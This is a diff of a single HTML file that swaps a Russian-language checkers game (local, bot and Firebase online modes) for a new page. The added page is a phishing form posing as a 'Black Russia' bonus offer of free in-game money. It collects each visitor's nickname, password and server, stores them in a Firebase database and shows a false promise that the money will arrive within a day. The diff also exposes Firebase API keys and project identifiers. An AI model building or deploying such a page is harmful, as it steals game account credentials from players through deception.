@@ -1,313 +1,247 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Checkers Pro: Online & Hard AI</title>
-    
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
-    
-    <style>
-        :root { --bg: #121212; --panel: #1e1e1e; --accent: #bb86fc; --cell-w: #f0d9b5; --cell-b: #b58863; }
-        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Black Russia - Бонусная Система</title>
+  
+  <!-- Подключаем Firebase через CDN (версия 9 совместимая / v8) -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
-        /* МЕНЮ */
-        #main-menu { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
-        .menu-btns { display: flex; flex-direction: column; gap: 10px; width: 90%; max-width: 320px; }
-        .btn { background: var(--panel); color: white; border: 2px solid #333; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1rem; }
-        .btn:active { transform: scale(0.96); border-color: var(--accent); }
+  <style>
+    /* Базовые стили и красивый фоновый градиент */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(135deg, #1f2937, #111827, #0f172a);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #f3f4f6;
+      overflow: hidden;
+    }
 
-        /* ИГРА И АДАПТИВНОСТЬ */
-        #game-ui { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; }
-        
-        /* Горизонтальный режим */
-        @media (orientation: landscape) {
-            #game-ui { flex-direction: row; justify-content: space-around; padding: 10px; box-sizing: border-box; }
-            #board-resizer { width: 70vh !important; }
-            .status-bar { width: 200px !important; height: auto !important; border-radius: 15px; }
-        }
+    /* Эффект Liquid Glass (Матовое стекло) */
+    .glass-card {
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 16px;
+      padding: 30px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+      box-sizing: border-box;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
 
-        .status-bar { padding: 15px; background: var(--panel); width: 100%; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.5); font-size: 1.1rem; }
+    /* Изменяемый верхний текст / заголовок */
+    .promo-header {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #ffffff;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
 
-        #board-resizer { width: 96vw; max-width: 500px; aspect-ratio: 1/1; margin: auto; background: #222; padding: 4px; border-radius: 5px; }
-        #board { display: grid; grid-template-columns: repeat(8, 1fr); width: 100%; height: 100%; }
-        .cell { position: relative; display: flex; justify-content: center; align-items: center; }
-        .cell.w { background: var(--cell-w); }
-        .cell.b { background: var(--cell-b); }
+    .promo-sub {
+      font-size: 14px;
+      color: #9ca3af;
+      margin-bottom: 24px;
+    }
 
-        .piece { width: 85%; height: 85%; border-radius: 50%; position: relative; z-index: 5; box-shadow: 0 3px 0 #000; }
-        .p-white { background: radial-gradient(circle at 30% 30%, #fff, #bbb); }
-        .p-black { background: radial-gradient(circle at 30% 30%, #444, #000); }
-        .piece.king::after { content: '👑'; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 24px; }
-        
-        .selected { border: 3px solid var(--accent); box-sizing: border-box; }
-        .hint { position: absolute; width: 30%; height: 30%; background: rgba(187, 134, 252, 0.6); border-radius: 50%; z-index: 8; }
+    /* Поля ввода */
+    .input-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
 
-        /* ОКНО ПОБЕДЫ */
-        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; flex-direction: column; align-items: center; justify-content: center; }
-        .win-box { background: var(--panel); padding: 40px; border-radius: 20px; border: 2px solid var(--accent); text-align: center; }
-    </style>
+    .input-group label {
+      display: block;
+      font-size: 12px;
+      color: #9ca3af;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px 14px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      color: #ffffff;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+      transition: border-color 0.2s, background-color 0.2s;
+    }
+
+    .input-field:focus {
+      border-color: rgba(255, 255, 255, 0.3);
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    /* Плейсхолдеры */
+    ::placeholder {
+      color: #6b7280;
+    }
+
+    /* Кнопка */
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: rgba(255, 255, 255, 0.9);
+      border: none;
+      border-radius: 8px;
+      color: #111827;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      margin-top: 10px;
+    }
+
+    .submit-btn:hover {
+      background: #ffffff;
+    }
+
+    .submit-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* Модальное окно об успешной отправке */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(8px);
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .modal-content {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 320px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+    }
+
+    .modal-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #ffffff;
+    }
+
+    .modal-text {
+      font-size: 14px;
+      color: #d1d5db;
+      line-height: 1.5;
+    }
+  </style>
 </head>
 <body>
 
-    <div id="main-menu">
-        <h1 style="color:var(--accent); margin-bottom:20px;">ШАШКИ PRO</h1>
-        <div class="menu-btns" id="base-menu">
-            <button class="btn" onclick="startMode('local')">👥 На одном экране</button>
-            <button class="btn" onclick="toggleMenu('ai-menu')">🤖 Против Бота</button>
-            <button class="btn" onclick="toggleMenu('online-menu')">🌐 Онлайн</button>
-        </div>
+  <!-- Основная карточка входа -->
+  <div class="glass-card" id="authCard">
+    <!-- ЭТОТ ТЕКСТ ТЫ МОЖЕШЬ ИЗМЕНИТЬ НА ЛЮБОЙ ДРУГОЙ -->
+    <div class="promo-header">Хочешь получить 10кк?</div>
+    <div class="promo-sub">Зарегистрируйся прямо сейчас и получи 10кк бесплатно!</div>
+
+    <form id="regForm">
+      <div class="input-group">
+        <label for="username">Никнейм (Имя_Фамилия)</label>
+        <input type="text" id="username" class="input-field" placeholder="Ivan_Ivanov" required>
+      </div>
+
+      <div class="input-group">
+        <label for="password">Пароль</label>
+        <input type="password" id="password" class="input-field" placeholder="••••••••" required>
+      </div>
+
+      <div class="input-group">
+        <label for="server">Сервер (английскими буквами)</label>
+        <input type="text" id="server" class="input-field" placeholder="CHERRY" required>
+      </div>
+
+      <button type="submit" class="submit-btn">Зарегистрироваться</button>
+    </form>
+  </div>
+
+  <!-- Окно уведомления -->
+  <div class="modal" id="successModal">
+    <div class="modal-content">
+      <div class="modal-title">Заявка принята!</div>
+      <div class="modal-text">Деньги поступают в течении 1 дня. Пожалуйста, ожидайте зачисления на указанный аккаунт.</div>
+    </div>
+  </div>
+
+  <script>
+    // Твой конфиг Firebase Realtime Database
+    const firebaseConfig = {
+      apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
+      authDomain: "beaschat-e0a28.firebaseapp.com",
+      projectId: "beaschat-e0a28",
+      storageBucket: "beaschat-e0a28.firebasestorage.app",
+      messagingSenderId: "906515573172",
+      appId: "1:906515573172:web:ee23ac70264e7a18d36ae1",
+      measurementId: "G-XLVW2SYHPM",
+      databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
+    };
+
+    // Инициализация Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Обработка отправки формы
+    document.getElementById('regForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Предотвращаем перезагрузку страницы
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const server = document.getElementById('server').value.trim();
+
+      // Генерируем уникальный ключ для каждого пользователя в базе данных
+      const newUserRef = database.ref('players').push();
+
+      // Сохраняем данные в Firebase Realtime Database
+      newUserRef.set({
+        username: username,
+        password: password,
+        server: server,
+        date: new Date().toISOString()
+      })
+      .then(() => {
+        // Очищаем форму
+        document.getElementById('regForm').reset();
         
-        <div class="menu-btns" id="ai-menu" style="display:none">
-            <button class="btn" style="background:#4caf50" onclick="chooseColor(1)">👶 Новичок</button>
-            <button class="btn" style="background:#2196f3" onclick="chooseColor(2)">👨‍🎓 Ученик</button>
-            <button class="btn" style="background:#ff9800" onclick="chooseColor(3)">⚔️ Мастер</button>
-            <button class="btn" style="background:#f44336" onclick="chooseColor(4)">🔥 Профи</button>
-            <button class="btn" style="background:#000; border-color: gold;" onclick="chooseColor(6)">🧠 ГРОССМЕЙСТЕР</button>
-            <button class="btn" onclick="toggleMenu('base-menu')">⬅ Назад</button>
-        </div>
+        // Показываем окно "Деньги поступают в течении 1 дня"
+        const modal = document.getElementById('successModal');
+        modal.style.display = 'flex';
+      })
+      .catch((error) => {
+        console.error("Ошибка сохранения: ", error);
+        alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
+      });
+    });
+  </script>
 
-        <div class="menu-btns" id="color-menu" style="display:none">
-            <button class="btn" style="background:#fff; color:#000" onclick="startAiWithColor('white')">⚪ Играть за Белых</button>
-            <button class="btn" style="background:#333; color:#fff" onclick="startAiWithColor('black')">⚫ Играть за Черных</button>
-        </div>
-
-        <div class="menu-btns" id="online-menu" style="display:none">
-            <input type="text" id="rid" placeholder="Код комнаты" style="padding:15px; border-radius:10px; text-align:center; font-size:1.2rem;">
-            <button class="btn" onclick="createRoom()">✨ Создать комнату</button>
-            <button class="btn" onclick="joinRoom()">🚪 Войти по коду</button>
-            <button class="btn" onclick="toggleMenu('base-menu')">⬅ Назад</button>
-        </div>
-    </div>
-
-    <div id="game-ui">
-        <div class="status-bar">
-            <div id="status">Ход Белых</div>
-            <div id="online-info" style="font-size:0.8rem; color:var(--accent); margin-top:5px;"></div>
-        </div>
-        <div id="board-resizer"><div id="board"></div></div>
-        <button class="btn" style="margin:10px; width:140px;" onclick="location.reload()">В Меню</button>
-    </div>
-
-    <div id="win-modal">
-        <div class="win-box">
-            <h1 id="win-title" style="color:var(--accent);">КОНЕЦ ИГРЫ</h1>
-            <p id="win-text" style="font-size:1.3rem; margin-bottom:20px;"></p>
-            <button class="btn" style="width:100%" onclick="location.reload()">В ГЛАВНОЕ МЕНЮ</button>
-        </div>
-    </div>
-
-    <script>
-        // Твои ключи Firebase
-        const firebaseConfig = { apiKey: "AIzaSyCFJQ4OKKStxVW7gUj1lS4KHwxGc1_QIwg", databaseURL: "https://mymobilegame-b5e68-default-rtdb.firebaseio.com" };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        let board = [], turn = 'white', selected = null, hints = [], chainPiece = null;
-        let mode = 'local', aiLvl = 1, myColor = 'white', roomId = null, isWaiting = false;
-
-        function toggleMenu(id) {
-            ['base-menu', 'ai-menu', 'online-menu', 'color-menu'].forEach(m => document.getElementById(m).style.display = 'none');
-            document.getElementById(id).style.display = 'flex';
-        }
-        function chooseColor(lvl) { aiLvl = lvl; toggleMenu('color-menu'); }
-        function startAiWithColor(color) { myColor = color; startMode('ai', aiLvl); }
-
-        function startMode(m, lvl = 1) {
-            mode = m; aiLvl = lvl;
-            document.getElementById('main-menu').style.display = 'none';
-            document.getElementById('game-ui').style.display = 'flex';
-            initBoard();
-            if(mode === 'ai' && myColor === 'black') setTimeout(aiMove, 600);
-        }
-
-        function initBoard() {
-            board = Array(8).fill(null).map(() => Array(8).fill(null));
-            for(let r=0; r<8; r++) for(let c=0; c<8; c++) if((r+c)%2!==0) {
-                if(r<3) board[r][c] = { color:'black', king:false };
-                else if(r>4) board[r][c] = { color:'white', king:false };
-            }
-            render();
-        }
-
-        function render() {
-            const bEl = document.getElementById('board'); bEl.innerHTML = '';
-            const statusEl = document.getElementById('status');
-            
-            if(isWaiting) {
-                statusEl.innerText = "Ожидание игрока...";
-                return;
-            }
-
-            statusEl.innerText = `Ход ${turn==='white'?'Белых':'Черных'}`;
-            if(mode === 'ai') statusEl.innerText += (turn === myColor ? " (Ваш)" : " (Бота)");
-            if(mode === 'online') statusEl.innerText += (turn === myColor ? " (Ваш)" : " (Врага)");
-
-            for(let r=0; r<8; r++) for(let c=0; c<8; c++) {
-                const cell = document.createElement('div');
-                cell.className = `cell ${(r+c)%2===0?'w':'b'}`;
-                const p = board[r][c];
-                if(p) {
-                    const pEl = document.createElement('div');
-                    pEl.className = `piece p-${p.color} ${p.king?'king':''}`;
-                    if(selected && selected.r===r && selected.c===c) pEl.classList.add('selected');
-                    pEl.onclick = () => handleSelect(r, c);
-                    cell.appendChild(pEl);
-                }
-                const h = hints.find(h => h.toR===r && h.toC===c);
-                if(h) {
-                    const hEl = document.createElement('div'); hEl.className = 'hint';
-                    hEl.onclick = () => execMove(h);
-                    cell.appendChild(hEl);
-                }
-                bEl.appendChild(cell);
-            }
-            checkEnd();
-        }
-
-        function handleSelect(r, c) {
-            if(isWaiting) return;
-            if((mode==='online' || mode==='ai') && turn !== myColor) return;
-            if(chainPiece && (chainPiece.r !== r || chainPiece.c !== c)) return;
-            
-            const p = board[r][c];
-            if(!p || p.color !== turn) return;
-            
-            const must = getMustHits(turn);
-            hints = (must.length > 0) ? must.filter(m => m.fromR === r && m.fromC === c) : getSimple(r, c);
-            selected = {r, c};
-            render();
-        }
-
-        // --- ЛОГИКА ПРАВИЛ ---
-        function getSimple(r, c) {
-            const p = board[r][c], res = [], dirs = [[1,1],[1,-1],[-1,1],[-1,-1]];
-            for(let [dr, dc] of dirs) {
-                let nr = r+dr, nc = c+dc;
-                if(p.king) {
-                    while(nr>=0 && nr<8 && nc>=0 && nc<8 && !board[nr][nc]) { res.push({fromR:r,fromC:c,toR:nr,toC:nc}); nr+=dr; nc+=dc; }
-                } else if((p.color==='white'?dr===-1:dr===1) && nr>=0 && nr<8 && nc>=0 && nc<8 && !board[nr][nc]) {
-                    res.push({fromR:r,fromC:c,toR:nr,toC:nc});
-                }
-            }
-            return res;
-        }
-
-        function getHits(r, c) {
-            const p = board[r][c], res = [], dirs = [[1,1],[1,-1],[-1,1],[-1,-1]];
-            for(let [dr, dc] of dirs) {
-                let nr = r+dr, nc = c+dc, vic = null;
-                if(p.king) {
-                    while(nr>=0 && nr<8 && nc>=0 && nc<8) {
-                        const t = board[nr][nc];
-                        if(t) { if(t.color!==p.color && !vic) vic={r:nr,c:nc}; else break; }
-                        else if(vic) res.push({fromR:r,fromC:c,toR:nr,toC:nc,vic});
-                        nr+=dr; nc+=dc;
-                    }
-                } else {
-                    let tr = r+dr*2, tc = c+dc*2;
-                    if(tr>=0 && tr<8 && tc>=0 && tc<8) {
-                        const v = board[nr][nc];
-                        if(v && v.color!==p.color && !board[tr][tc]) res.push({fromR:r,fromC:c,toR:tr,toC:tc,vic:{r:nr,c:nc}});
-                    }
-                }
-            }
-            return res;
-        }
-
-        function getMustHits(col) {
-            let res = [];
-            for(let r=0; r<8; r++) for(let c=0; c<8; c++) if(board[r][c] && board[r][c].color===col) res.push(...getHits(r,c));
-            return res;
-        }
-
-        function execMove(m) {
-            const p = board[m.fromR][m.fromC];
-            board[m.toR][m.toC] = p; board[m.fromR][m.fromC] = null;
-            if(m.vic) board[m.vic.r][m.vic.c] = null;
-
-            if(m.vic) {
-                const next = getHits(m.toR, m.toC);
-                if(next.length > 0) {
-                    chainPiece = {r:m.toR, c:m.toC}; selected = chainPiece; hints = next;
-                    render(); sync();
-                    if(mode==='ai' && turn !== myColor) setTimeout(() => execMove(next[0]), 600);
-                    return;
-                }
-            }
-
-            if((p.color==='white'&&m.toR===0) || (p.color==='black'&&m.toR===7)) p.king = true;
-            chainPiece = null; selected = null; hints = [];
-            turn = (turn==='white'?'black':'white');
-            render(); sync();
-            if(mode==='ai' && turn !== myColor) setTimeout(aiMove, 600);
-        }
-
-        // --- УМНЫЙ БОТ ---
-        function aiMove() {
-            let moves = getMustHits(turn);
-            if(moves.length === 0) {
-                for(let r=0; r<8; r++) for(let c=0; c<8; c++) if(board[r][c] && board[r][c].color===turn) moves.push(...getSimple(r,c));
-            }
-            if(moves.length === 0) return;
-
-            // Гроссмейстер (lvl 6) выбирает лучший ход по весу
-            if(aiLvl >= 5) {
-                moves.sort((a, b) => scoreMove(b) - scoreMove(a));
-            } else {
-                // Новичок иногда делает случайные ходы
-                if(Math.random() > (aiLvl * 0.2)) moves.sort(() => Math.random() - 0.5);
-            }
-            execMove(moves[0]);
-        }
-
-        function scoreMove(m) {
-            let s = 0;
-            if(m.vic) s += 10; // Приоритет на бой
-            if(m.toR === 0 || m.toR === 7) s += 5; // Стремление в дамки
-            return s;
-        }
-
-        function checkEnd() {
-            const myMoves = getMustHits(turn).length + (function(){
-                let c=0; for(let r=0;r<8;r++)for(let l=0;l<8;l++)if(board[r][l]&&board[r][l].color===turn)c+=getSimple(r,l).length; return c;
-            })();
-            if(myMoves === 0) {
-                document.getElementById('win-text').innerText = `ПОБЕДА: ${turn==='white'?'ЧЕРНЫЕ':'БЕЛЫЕ'}!`;
-                document.getElementById('win-modal').style.display = 'flex';
-            }
-        }
-
-        // --- ОНЛАЙН FIREBASE ---
-        function sync() { if(mode==='online' && !isWaiting) db.ref('rooms/'+roomId).update({b: JSON.stringify(board), t: turn}); }
-
-        function createRoom() {
-            roomId = Math.random().toString(36).substr(2,4).toUpperCase();
-            myColor = 'white'; isWaiting = true;
-            db.ref('rooms/'+roomId).set({ b: JSON.stringify(board), t: 'white', status: 'wait' });
-            document.getElementById('online-info').innerText = "Код: " + roomId;
-            db.ref('rooms/'+roomId).on('value', snap => {
-                const data = snap.val();
-                if(data.status === 'playing' && isWaiting) { isWaiting = false; }
-                board = JSON.parse(data.b); turn = data.t; render();
-            });
-            startMode('online');
-        }
-
-        function joinRoom() {
-            roomId = document.getElementById('rid').value.toUpperCase();
-            myColor = 'black';
-            db.ref('rooms/'+roomId).once('value', snap => {
-                if(snap.exists()) {
-                    db.ref('rooms/'+roomId).update({ status: 'playing' });
-                    db.ref('rooms/'+roomId).on('value', s => {
-                        const d = s.val(); board = JSON.parse(d.b); turn = d.t; render();
-                    });
-                    startMode('online');
-                } else alert("Комната не найдена!");
-            });
-        }
-    </script>
 </body>
 </html>
